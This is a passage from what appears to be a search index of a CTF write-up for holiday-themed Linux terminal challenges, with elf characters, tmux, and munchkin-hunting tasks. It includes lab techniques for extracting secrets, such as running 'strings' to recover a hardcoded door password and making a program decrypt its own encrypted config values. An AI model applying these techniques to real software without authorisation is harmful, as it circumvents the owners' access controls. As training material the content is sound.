Coalbox!","title":"Rejoice"},{"location":"terminals/terminal2/","text":"2) Linux Primer Chat with Sugarplum Mary Sugarplum Mary? That's me! I was just playing with this here terminal and learning some Linux! It's a great intro to the Bash terminal. If you get stuck at any point, type hintme to get a nudge! Can you make it to the end? Solution Q1. Perform a directory listing of your home directory to find a munchkin and retrieve a lollipop! A1. elf@16d33c457879:~$ cd elf@16d33c457879:~$ ls HELP munchkin_19315479765589239 workshop Q2. Now find the munchkin inside the munchkin. A2. elf@16d33c457879:~$ cat munchkin_19315479765589239 munchkin_24187022596776786 Q3. Great, now remove the munchkin in your home directory. A3. elf@16d33c457879:~$ cd elf@16d33c457879:~$ ls HELP munchkin_19315479765589239 workshop elf@16d33c457879:~$ rm munchkin_19315479765589239 Q4. Print the present working directory using a command. A4. elf@16d33c457879:~$ pwd /home/elf Q5. Good job but it looks like another munchkin hid itself in you home directory. Find the hidden munchkin! A5. elf@16d33c457879:~$ ls -a . .. .bash_history .bash_logout .bashrc .munchkin_5074624024543078 .profile HELP workshop Q6. Excellent, now find the munchkin in your command history. A6. elf@16d33c457879:~$ history 1 echo munchkin_9394554126440791 2 cd 3 ls 4 cd munchkin_19315479765589239 5 cat munchkin_19315479765589239 6 cd 7 ls 8 rm munchkin_19315479765589239 9 pwd 10 ls -a 11 history Q7. Find the munchkin in your environment variables. A7. elf@16d33c457879:~$ printenv LC_ALL=C.UTF-8 LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31$ 01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.$ rc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.tx$ =01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*$ lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2$ 01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;$ 1:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*$ swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:$ .bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.t$ ff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mp$ g=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob =01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01; 35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*. emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.mid i=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=0 0;36:*.spx=00;36:*.xspf=00;36: TOKENS= LESSCLOSE=/usr/bin/lesspipe %s %s LANG=C.UTF-8 HOSTNAME=16d33c457879 OLDPWD=/home/elf GREENSTATUSPREFIX=Lollipops USER=elf HHCUSERNAME=santaninja PWD=/home/elf AREA=courtyard HOME=/home/elf TMUX=/tmp/tmux-1050/default,16,0 BPUSER=elf z_MUNCHKIN=munchkin_20249649541603754 LOCATION=14,13 RESOURCE_ID=b9af802b-8d25-46ad-9056-516e038e11e6 MAIL=/var/mail/elf SHELL=/bin/bash TERM=screen TMOUT=3600 TMUX_PANE=%2 SHLVL=4 BPUSERHOME=/home/elf SESSNAME=Munchkin Wrangler LOGNAME=elf PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin LESSOPEN=| /usr/bin/lesspipe %s Q8. Next, head into the workshop. A8. elf@16d33c457879:~$ ls HELP workshop elf@16d33c457879:~$ cd workshop/ Q9. A munchkin is hiding in one of the workshop toolboxes. Use \"grep\" while ignoring case to find which toolbox the munchkin is in. A9. elf@16d33c457879:~/workshop$ grep -irwn \".*munchkin.*\" toolbox_191.txt:1:mUnChKin.4056180441832623 Q10. A munchkin is blocking the lollipop_engine from starting. Run the lollipop_engine binary to retrieve this munchkin. A10. elf@16d33c457879:~/workshop$ find / -name \"*lollipop_engine*\" 2>/dev/null /opt/lollipop_engine /home/elf/workshop/lollipop_engine elf@16d33c457879:~/workshop$ ./lollipop_engine bash: ./lollipop_engine: Permission denied elf@16d33c457879:~/workshop$ chmod a+x lollipop_engine elf@16d33c457879:~/workshop$ ./lollipop_engine munchkin.898906189498077 Q10. A munchkin is blocking the lollipop_engine from starting. Run the lollipop_engine binary to retrieve this munchkin. A10. elf@16d33c457879:~/workshop$ find / -name \"*lollipop_engine*\" 2>/dev/null /opt/lollipop_engine /home/elf/workshop/lollipop_engine elf@16d33c457879:~/workshop$ ./lollipop_engine bash: ./lollipop_engine: Permission denied elf@16d33c457879:~/workshop$ chmod a+x lollipop_engine elf@16d33c457879:~/workshop$ ./lollipop_engine munchkin.898906189498077 Q11. Munchkins have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blow n_fuse0 to fuse0. A11. elf@16d33c457879:~/workshop$ cd electrical/ elf@16d33c457879:~/workshop/electrical$ ls blown_fuse0 elf@c7cd9ad55319:~/workshop/electrical$ mv blown_fuse0 fuse0 Q12. Now, make a symbolic link (symlink) named fuse1 that points to fuse0 A12. elf@c7cd9ad55319:~/workshop/electrical$ ln -s fuse0 fuse1 elf@c7cd9ad55319:~/workshop/electrical$ ls -l fuse1 lrwxrwxrwx 1 elf elf 5 Jan 12 05:00 fuse1 -> fuse0 Q13. Make a copy of fuse1 named fuse2. A13. elf@c7cd9ad55319:~/workshop/electrical$ cp fuse1 fuse2 Q14. We need to make sure munchkins don't come back. Add the characters \"MUNCHKIN_REPELLENT\" into the file fuse2. A14. elf@c7cd9ad55319:~/workshop/electrical$ echo \"MUNCHKIN_REPELLENT\" > fuse2 Q15. Find the munchkin somewhere in /opt/munchkin_den. A15. elf@c7cd9ad55319:~/workshop/electrical$ find /opt/munchkin_den -iname \"*munchkin*\" /opt/munchkin_den /opt/munchkin_den/apps/showcase/src/main/resources/mUnChKin.6253159819943018 Q16. Find the file somewhere in /opt/munchkin_den that is owned by the user munchkin. A16. elf@c7cd9ad55319:~/workshop/electrical$ find /opt/munchkin_den/ -user munchkin /opt/munchkin_den/apps/showcase/src/main/resources/template/ajaxErrorContainers/niKhCnUm_9528909612014411 Q17. Find the file created by munchkins that is greater than 108 kilobytes and less than 110 kilobytes l ocated somewhere in /opt/munchkin_den. A17. elf@c7cd9ad55319:~/workshop/electrical$ find /opt/munchkin_den/ -size +108k -size -110k /opt/munchkin_den/plugins/portlet-mocks/src/test/java/org/apache/m_u_n_c_h_k_i_n_2579728047101724 Q18. List running processes to find another munchkin. A18. elf@c7cd9ad55319:~/workshop/electrical$ ps -ef UID PID PPID C STIME TTY TIME CMD init 1 0 0 04:56 pts/0 00:00:00 /usr/bin/python3 /usr/local/bin/tmuxp load ./mysess elf 19860 19857 0 05:08 pts/2 00:00:00 /usr/bin/python3 /14516_munchkin elf 20928 426 0 05:08 pts/3 00:00:00 ps -ef Q19. The 14516_munchkin process is listening on a tcp port. Use a command to have the only listening port display to the screen. A19. elf@c7cd9ad55319:~/workshop/electrical$ netstat -l Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:54321 0.0.0.0:* LISTEN Active UNIX domain sockets (only servers) Proto RefCnt Flags Type State I-Node Path unix 2 [ ACC ] STREAM LISTENING 97006117 /tmp/tmux-1050/default Q20. The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the la st munchkin. A2. elf@c7cd9ad55319:~/workshop/electrical$ curl 0 0.0.0.0:54321 curl: (7) Failed to connect to 0 port 80: Connection refused Q21. Your final task is to stop the 14516_munchkin process to collect the remaining lollipops. A21. elf@c7cd9ad55319:~/workshop/electrical$ ps -ef UID PID PPID C STIME TTY TIME CMD init 1 0 0 04:56 pts/0 00:00:00 /usr/bin/python3 /usr/local/bin/tmuxp load ./mysess elf 19860 19857 0 05:08 pts/2 00:00:00 /usr/bin/python3 /14516_munchkin elf 26640 426 0 05:12 pts/3 00:00:00 ps -ef elf@c7cd9ad55319:~/workshop/electrical$ kill 19860 Rejoice Yay! we helped Sugarplum Mary!","title":"Linux Primer"},{"location":"terminals/terminal2/#2-linux-primer","text":"","title":"2) Linux Primer"},{"location":"terminals/terminal2/#chat-with-sugarplum-mary","text":"Sugarplum Mary? That's me! I was just playing with this here terminal and learning some Linux! It's a great intro to the Bash terminal. If you get stuck at any point, type hintme to get a nudge! Can you make it to the end?","title":"Chat with Sugarplum Mary"},{"location":"terminals/terminal2/#solution","text":"Q1. Perform a directory listing of your home directory to find a munchkin and retrieve a lollipop! A1. elf@16d33c457879:~$ cd elf@16d33c457879:~$ ls HELP munchkin_19315479765589239 workshop Q2. Now find the munchkin inside the munchkin. A2. elf@16d33c457879:~$ cat munchkin_19315479765589239 munchkin_24187022596776786 Q3. Great, now remove the munchkin in your home directory. A3. elf@16d33c457879:~$ cd elf@16d33c457879:~$ ls HELP munchkin_19315479765589239 workshop elf@16d33c457879:~$ rm munchkin_19315479765589239 Q4. Print the present working directory using a command. A4. elf@16d33c457879:~$ pwd /home/elf Q5. Good job but it looks like another munchkin hid itself in you home directory. Find the hidden munchkin! A5. elf@16d33c457879:~$ ls -a . .. .bash_history .bash_logout .bashrc .munchkin_5074624024543078 .profile HELP workshop Q6. Excellent, now find the munchkin in your command history. A6. elf@16d33c457879:~$ history 1 echo munchkin_9394554126440791 2 cd 3 ls 4 cd munchkin_19315479765589239 5 cat munchkin_19315479765589239 6 cd 7 ls 8 rm munchkin_19315479765589239 9 pwd 10 ls -a 11 history Q7. Find the munchkin in your environment variables. A7. elf@16d33c457879:~$ printenv LC_ALL=C.UTF-8 LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31$ 01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.$ rc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.tx$ =01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*$ lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2$ 01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;$ 1:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*$ swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:$ .bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.t$ ff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mp$ g=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob =01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01; 35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*. emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.mid i=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=0 0;36:*.spx=00;36:*.xspf=00;36: TOKENS= LESSCLOSE=/usr/bin/lesspipe %s %s LANG=C.UTF-8 HOSTNAME=16d33c457879 OLDPWD=/home/elf GREENSTATUSPREFIX=Lollipops USER=elf HHCUSERNAME=santaninja PWD=/home/elf AREA=courtyard HOME=/home/elf TMUX=/tmp/tmux-1050/default,16,0 BPUSER=elf z_MUNCHKIN=munchkin_20249649541603754 LOCATION=14,13 RESOURCE_ID=b9af802b-8d25-46ad-9056-516e038e11e6 MAIL=/var/mail/elf SHELL=/bin/bash TERM=screen TMOUT=3600 TMUX_PANE=%2 SHLVL=4 BPUSERHOME=/home/elf SESSNAME=Munchkin Wrangler LOGNAME=elf PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin LESSOPEN=| /usr/bin/lesspipe %s Q8. Next, head into the workshop. A8. elf@16d33c457879:~$ ls HELP workshop elf@16d33c457879:~$ cd workshop/ Q9. A munchkin is hiding in one of the workshop toolboxes. Use \"grep\" while ignoring case to find which toolbox the munchkin is in. A9. elf@16d33c457879:~/workshop$ grep -irwn \".*munchkin.*\" toolbox_191.txt:1:mUnChKin.4056180441832623 Q10. A munchkin is blocking the lollipop_engine from starting. Run the lollipop_engine binary to retrieve this munchkin. A10. elf@16d33c457879:~/workshop$ find / -name \"*lollipop_engine*\" 2>/dev/null /opt/lollipop_engine /home/elf/workshop/lollipop_engine elf@16d33c457879:~/workshop$ ./lollipop_engine bash: ./lollipop_engine: Permission denied elf@16d33c457879:~/workshop$ chmod a+x lollipop_engine elf@16d33c457879:~/workshop$ ./lollipop_engine munchkin.898906189498077 Q10. A munchkin is blocking the lollipop_engine from starting. Run the lollipop_engine binary to retrieve this munchkin. A10. elf@16d33c457879:~/workshop$ find / -name \"*lollipop_engine*\" 2>/dev/null /opt/lollipop_engine /home/elf/workshop/lollipop_engine elf@16d33c457879:~/workshop$ ./lollipop_engine bash: ./lollipop_engine: Permission denied elf@16d33c457879:~/workshop$ chmod a+x lollipop_engine elf@16d33c457879:~/workshop$ ./lollipop_engine munchkin.898906189498077 Q11. Munchkins have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blow n_fuse0 to fuse0. A11. elf@16d33c457879:~/workshop$ cd electrical/ elf@16d33c457879:~/workshop/electrical$ ls blown_fuse0 elf@c7cd9ad55319:~/workshop/electrical$ mv blown_fuse0 fuse0 Q12. Now, make a symbolic link (symlink) named fuse1 that points to fuse0 A12. elf@c7cd9ad55319:~/workshop/electrical$ ln -s fuse0 fuse1 elf@c7cd9ad55319:~/workshop/electrical$ ls -l fuse1 lrwxrwxrwx 1 elf elf 5 Jan 12 05:00 fuse1 -> fuse0 Q13. Make a copy of fuse1 named fuse2. A13. elf@c7cd9ad55319:~/workshop/electrical$ cp fuse1 fuse2 Q14. We need to make sure munchkins don't come back. Add the characters \"MUNCHKIN_REPELLENT\" into the file fuse2. A14. elf@c7cd9ad55319:~/workshop/electrical$ echo \"MUNCHKIN_REPELLENT\" > fuse2 Q15. Find the munchkin somewhere in /opt/munchkin_den. A15. elf@c7cd9ad55319:~/workshop/electrical$ find /opt/munchkin_den -iname \"*munchkin*\" /opt/munchkin_den /opt/munchkin_den/apps/showcase/src/main/resources/mUnChKin.6253159819943018 Q16. Find the file somewhere in /opt/munchkin_den that is owned by the user munchkin. A16. elf@c7cd9ad55319:~/workshop/electrical$ find /opt/munchkin_den/ -user munchkin /opt/munchkin_den/apps/showcase/src/main/resources/template/ajaxErrorContainers/niKhCnUm_9528909612014411 Q17. Find the file created by munchkins that is greater than 108 kilobytes and less than 110 kilobytes l ocated somewhere in /opt/munchkin_den. A17. elf@c7cd9ad55319:~/workshop/electrical$ find /opt/munchkin_den/ -size +108k -size -110k /opt/munchkin_den/plugins/portlet-mocks/src/test/java/org/apache/m_u_n_c_h_k_i_n_2579728047101724 Q18. List running processes to find another munchkin. A18. elf@c7cd9ad55319:~/workshop/electrical$ ps -ef UID PID PPID C STIME TTY TIME CMD init 1 0 0 04:56 pts/0 00:00:00 /usr/bin/python3 /usr/local/bin/tmuxp load ./mysess elf 19860 19857 0 05:08 pts/2 00:00:00 /usr/bin/python3 /14516_munchkin elf 20928 426 0 05:08 pts/3 00:00:00 ps -ef Q19. The 14516_munchkin process is listening on a tcp port. Use a command to have the only listening port display to the screen. A19. elf@c7cd9ad55319:~/workshop/electrical$ netstat -l Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:54321 0.0.0.0:* LISTEN Active UNIX domain sockets (only servers) Proto RefCnt Flags Type State I-Node Path unix 2 [ ACC ] STREAM LISTENING 97006117 /tmp/tmux-1050/default Q20. The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the la st munchkin. A2. elf@c7cd9ad55319:~/workshop/electrical$ curl 0 0.0.0.0:54321 curl: (7) Failed to connect to 0 port 80: Connection refused Q21. Your final task is to stop the 14516_munchkin process to collect the remaining lollipops. A21. elf@c7cd9ad55319:~/workshop/electrical$ ps -ef UID PID PPID C STIME TTY TIME CMD init 1 0 0 04:56 pts/0 00:00:00 /usr/bin/python3 /usr/local/bin/tmuxp load ./mysess elf 19860 19857 0 05:08 pts/2 00:00:00 /usr/bin/python3 /14516_munchkin elf 26640 426 0 05:12 pts/3 00:00:00 ps -ef elf@c7cd9ad55319:~/workshop/electrical$ kill 19860","title":"Solution"},{"location":"terminals/terminal2/#rejoice","text":"Yay! we helped Sugarplum Mary!","title":"Rejoice"},{"location":"terminals/terminal3/","text":"3) Unescape Tmux Chat with Pepper Minstix Howdy - Pepper Minstix here! I've been playing with tmux lately, and golly it's useful. Problem is: I somehow became detached from my session. Do you think you could get me back to where I was, admiring a beautiful bird? If you find it handy, there's a tmux cheat sheet you can use as a reference. I hope you can help! Hints Courtesy Pepper Minstix Tmux Cheat Sheet There's a handy tmux reference available at https://tmuxcheatsheet.com/! Solution Based on the cheatsheet we can see that the required command is tmux attach-session . Can you help me? I was playing with my birdie (she's a Green Cheek!) in something called tmux, then I did something and it disappeared! Can you help me find her? We were so attached!! elf@c74a150a5605:~$ tmux attach-session ..............................'.''''''.''''''''''''' [12/12] .........................................''''''''''' ................................,:lccc:;,'...''''''' .............................';loodxkkxxdlc;'..''''' ............................,:ccllcldx0dxxdoc..''''' ...........................;ccclooodkOkok0OOx:..'''' .........................':cccllodxxkkkOkxdxx;....'' ........................,cccllooddxkOOOkOxoo'.....'' ......................';:cclllccllodO0Okkkx;...'''.. .....................:llollclclccccclokc::'......... ...................;ddollllllllcccccccl;............ ..................:xdooddoooolclllllolld;........... .................'xxoodxxxdoooooooxkdooox'.......... .................,xxkxdxkkxxdddddddxkkxdxl....'..... .................'xOkooddxkkxxdddxxkkxxxxx'.......'. ..................oOkddxkkkkdxxdddxxxxxxdd:......'.' .................';k0xxkxxOxdddddoodxdxkkx:....''''' ................'',o0xdddxkxdxdodddddkkkxxc....''''' ................',,:OK0kkOOxddddxxxddxxkxd:''''''''' .............',;:cccdKXKOkkOOxkxdxxxxxxkOx;''''''''' ...........:oxdddxkkxOXXOxxkxxkkkkkkkxxdxx,,'''''''' ...........:oxdddxkkxOXXOxxkxxkkkkkkkxxdxx,,'''''''' .......''':c:,..'coodOO00OOOO00kxOkK0KkO0d,,'''''''' ...;cllc::clddooddOkxoccccccloddxxO0KK0KKOc:;,'''''' 'ldolcc:::lldxkOxkO000OOOOkkxxdddxoooooooooodxxxddol xxlcc:::::xolldddxOOdddxxxkkOOO0000000xkOkkxddoooooo lo:::cccc::ldoodooxd,;lxxkkO0OOOOOOOOOOOOOO000000000 locclccccccccldkxdkk:,;cdxkOKXXXKKKKKXXKk::::cllodxk xxollllcccllcodkOkO0:,,,:dkOOKKXXXKKKXXKl,,''''''''' xxkolllllllllodkO0KO;,,,;;lxO00KKXKKKKK0c;,,,,,,,,,, ,dxxxdoooollodxk0KOolc:::::cdO00KK00K000c;,,,,,,,,,; ..:xkOOkdoxxkOO0OxoooooolooodxOO00Ok0kk0oc:;;;;;;;;; ....:dkOddOO0OkdoolllllloooddxOOOOOkkkkOdllccccccccc You found her! Thank you!!! Rejoice Yay! we helped Pepper Minstix!","title":"Unescape Tmux"},{"location":"terminals/terminal3/#3-unescape-tmux","text":"","title":"3) Unescape Tmux"},{"location":"terminals/terminal3/#chat-with-pepper-minstix","text":"Howdy - Pepper Minstix here! I've been playing with tmux lately, and golly it's useful. Problem is: I somehow became detached from my session. Do you think you could get me back to where I was, admiring a beautiful bird? If you find it handy, there's a tmux cheat sheet you can use as a reference. I hope you can help!","title":"Chat with Pepper Minstix"},{"location":"terminals/terminal3/#hints-courtesy-pepper-minstix","text":"","title":"Hints Courtesy Pepper Minstix"},{"location":"terminals/terminal3/#tmux-cheat-sheet","text":"There's a handy tmux reference available at https://tmuxcheatsheet.com/!","title":"Tmux Cheat Sheet"},{"location":"terminals/terminal3/#solution","text":"Based on the cheatsheet we can see that the required command is tmux attach-session . Can you help me? I was playing with my birdie (she's a Green Cheek!) in something called tmux, then I did something and it disappeared! Can you help me find her? We were so attached!! elf@c74a150a5605:~$ tmux attach-session ..............................'.''''''.''''''''''''' [12/12] .........................................''''''''''' ................................,:lccc:;,'...''''''' .............................';loodxkkxxdlc;'..''''' ............................,:ccllcldx0dxxdoc..''''' ...........................;ccclooodkOkok0OOx:..'''' .........................':cccllodxxkkkOkxdxx;....'' ........................,cccllooddxkOOOkOxoo'.....'' ......................';:cclllccllodO0Okkkx;...'''.. .....................:llollclclccccclokc::'......... ...................;ddollllllllcccccccl;............ ..................:xdooddoooolclllllolld;........... .................'xxoodxxxdoooooooxkdooox'.......... .................,xxkxdxkkxxdddddddxkkxdxl....'..... .................'xOkooddxkkxxdddxxkkxxxxx'.......'. ..................oOkddxkkkkdxxdddxxxxxxdd:......'.' .................';k0xxkxxOxdddddoodxdxkkx:....''''' ................'',o0xdddxkxdxdodddddkkkxxc....''''' ................',,:OK0kkOOxddddxxxddxxkxd:''''''''' .............',;:cccdKXKOkkOOxkxdxxxxxxkOx;''''''''' ...........:oxdddxkkxOXXOxxkxxkkkkkkkxxdxx,,'''''''' ...........:oxdddxkkxOXXOxxkxxkkkkkkkxxdxx,,'''''''' .......''':c:,..'coodOO00OOOO00kxOkK0KkO0d,,'''''''' ...;cllc::clddooddOkxoccccccloddxxO0KK0KKOc:;,'''''' 'ldolcc:::lldxkOxkO000OOOOkkxxdddxoooooooooodxxxddol xxlcc:::::xolldddxOOdddxxxkkOOO0000000xkOkkxddoooooo lo:::cccc::ldoodooxd,;lxxkkO0OOOOOOOOOOOOOO000000000 locclccccccccldkxdkk:,;cdxkOKXXXKKKKKXXKk::::cllodxk xxollllcccllcodkOkO0:,,,:dkOOKKXXXKKKXXKl,,''''''''' xxkolllllllllodkO0KO;,,,;;lxO00KKXKKKKK0c;,,,,,,,,,, ,dxxxdoooollodxk0KOolc:::::cdO00KK00K000c;,,,,,,,,,; ..:xkOOkdoxxkOO0OxoooooolooodxOO00Ok0kk0oc:;;;;;;;;; ....:dkOddOO0OkdoolllllloooddxOOOOOkkkkOdllccccccccc You found her! Thank you!!!","title":"Solution"},{"location":"terminals/terminal3/#rejoice","text":"Yay! we helped Pepper Minstix!","title":"Rejoice"},{"location":"terminals/terminal4/","text":"4) Speaker Door Open Chat with Bushy Evergreen Ohai! Bushy Evergreen, just trying to get this door open. It's running some Rust code written by Alabaster Snowball. I'm pretty sure the password I need for ./door is right in the executable itself. Isn't there a way to view the human-readable strings in a binary file? Hints Courtesy Bushy Evergreen Strings in Binary Files The strings command is common in Linux and available in Windows as part of SysInternals. Solution Let's use the strings command as hinted to find readable strings in the binary. Help us get into the Speaker Unpreparedness Room! The door is controlled by ./door, but it needs a password! If you can figure out the password, it'll open the door right up! Oh, and if you have extra time, maybe you can turn on the lights with ./lights activate the vending machines with ./vending-machines? Those are a little trickier, they have configuration files, but it'd help us a lot! (You can do one now and come back to do the others later if you want) We copied edit-able versions of everything into the ./lab/ folder, in case you want to try EDITING or REMOVING the configuration files to see how the binaries react. Note: These don't require low-level reverse engineering, so you can put away IDA and Ghidra (unless you WANT to use them!) elf@a780a05c110f ~ $ ls door lab lights lights.conf vending-machines vending-machines.json elf@a780a05c110f ~ $ strings door Among the output we see the following lines. /home/elf/doorYou look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There's gotta be a tool for this... What do you enter? > opendoor (bytes Overflowextern \" NulErrorBox<Any>thread 'expected, found Door opened! That would have opened the door! Be sure to finish the challenge in prod: And don't forget, the password is \"Op3nTheD00r\" We got the password! elf@a780a05c110f ~ $ ./door You look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There's gotta be a tool for this... What do you enter? > Op3nTheD00r Checking...... Door opened! Rejoice Yay! we helped Bushy Evergreen with the door!","title":"Speaker Door Open"},{"location":"terminals/terminal4/#4-speaker-door-open","text":"","title":"4) Speaker Door Open"},{"location":"terminals/terminal4/#chat-with-bushy-evergreen","text":"Ohai! Bushy Evergreen, just trying to get this door open. It's running some Rust code written by Alabaster Snowball. I'm pretty sure the password I need for ./door is right in the executable itself. Isn't there a way to view the human-readable strings in a binary file?","title":"Chat with Bushy Evergreen"},{"location":"terminals/terminal4/#hints-courtesy-bushy-evergreen","text":"","title":"Hints Courtesy Bushy Evergreen"},{"location":"terminals/terminal4/#strings-in-binary-files","text":"The strings command is common in Linux and available in Windows as part of SysInternals.","title":"Strings in Binary Files"},{"location":"terminals/terminal4/#solution","text":"Let's use the strings command as hinted to find readable strings in the binary. Help us get into the Speaker Unpreparedness Room! The door is controlled by ./door, but it needs a password! If you can figure out the password, it'll open the door right up! Oh, and if you have extra time, maybe you can turn on the lights with ./lights activate the vending machines with ./vending-machines? Those are a little trickier, they have configuration files, but it'd help us a lot! (You can do one now and come back to do the others later if you want) We copied edit-able versions of everything into the ./lab/ folder, in case you want to try EDITING or REMOVING the configuration files to see how the binaries react. Note: These don't require low-level reverse engineering, so you can put away IDA and Ghidra (unless you WANT to use them!) elf@a780a05c110f ~ $ ls door lab lights lights.conf vending-machines vending-machines.json elf@a780a05c110f ~ $ strings door Among the output we see the following lines. /home/elf/doorYou look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There's gotta be a tool for this... What do you enter? > opendoor (bytes Overflowextern \" NulErrorBox<Any>thread 'expected, found Door opened! That would have opened the door! Be sure to finish the challenge in prod: And don't forget, the password is \"Op3nTheD00r\" We got the password! elf@a780a05c110f ~ $ ./door You look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There's gotta be a tool for this... What do you enter? > Op3nTheD00r Checking...... Door opened!","title":"Solution"},{"location":"terminals/terminal4/#rejoice","text":"Yay! we helped Bushy Evergreen with the door!","title":"Rejoice"},{"location":"terminals/terminal5/","text":"5) Speaker Lights On Chat with Bushy Evergreen Hey, you want to help me figure out the light switch too? Those come in handy sometimes. The password we need is in the lights.conf file, but it seems to be encrypted. There's another instance of the program and configuration in ~/lab/ you can play around with. What if we set the user name to an encrypted value? Hints Courtesy Bushy Evergreen Letting a Program Decrypt for You While you have to use the lights program in /home/elf/ to turn the lights on, you can delete parts in /home/elf/lab/. Solution let's analyse the lights program in the lab. We see that the conf file has two fields username and password . Help us get into the Speaker Unpreparedness Room! The door is controlled by ./door, but it needs a password! If you can figure out the password, it'll open the door right up! password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 Oh, and if you have extra time, maybe you can turn on the lights with ./lights activate the vending machines with ./vending-machines? Those are a little trickier, they have configuration files, but it'd help us a lot! (You can do one now and come back to do the others later if you want) We copied edit-able versions of everything into the ./lab/ folder, in case you want to try EDITING or REMOVING the configuration files to see how the binaries react. Note: These don't require low-level reverse engineering, so you can put away IDA and Ghidra (unless you WANT to use them!) elf@b3eaa0c05001 ~ $ ls door lab lights lights.conf vending-machines vending-machines.json elf@b3eaa0c05001 ~ $ cd lab/ elf@b3eaa0c05001 ~/lab $ ls door lights lights.conf vending-machines vending-machines.json elf@b3eaa0c05001 ~/lab $ cat lights.conf password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 name: elf-technician When we run the program we see the following lines which state selected fields decrypted and the username is also displayed on the screen. What if the same decryption program was used to deprypt the username and password? elf@b3eaa0c05001 ~ $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin--- >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: 